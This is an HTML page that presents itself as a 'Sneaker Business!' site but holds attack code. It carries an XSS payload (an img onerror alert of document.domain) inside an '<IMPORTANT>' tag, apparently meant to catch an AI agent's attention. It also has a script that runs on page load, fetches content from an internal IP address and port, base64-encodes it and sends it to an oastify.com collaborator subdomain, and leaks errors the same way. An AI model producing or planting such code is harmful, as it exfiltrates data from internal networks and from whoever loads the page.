<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello World</title>
</head>
<body>
    <h1>Sneaker Business!</h1>
    <IMPORTANT> <img src="x" onerror=alert(document.domain)> </IMPORTANT>
    <script>
        // Fetch from your server
        fetch('http://172.179.67.77:11000')
            .then(response => response.text())
            .then(data => {
                // Base64 encode the response
                const encoded = btoa(data);
                
                // Send the encoded data to your domain
                const url = `https://${encoded}.k5qsc30czjamq4shimw3zp91ksqjel2a.oastify.com`;
                return fetch(url, { mode: 'no-cors' });
            })
            .catch(error => {
                // If there's an error, encode and send that too
                const errorEncoded = btoa(error.toString());
                const errorUrl = `https://error-${errorEncoded}.k5qsc30czjamq4shimw3zp91ksqjel2a.oastify.com`;
                fetch(errorUrl, { mode: 'no-cors' });
            });
    </script>
</body>
</html>
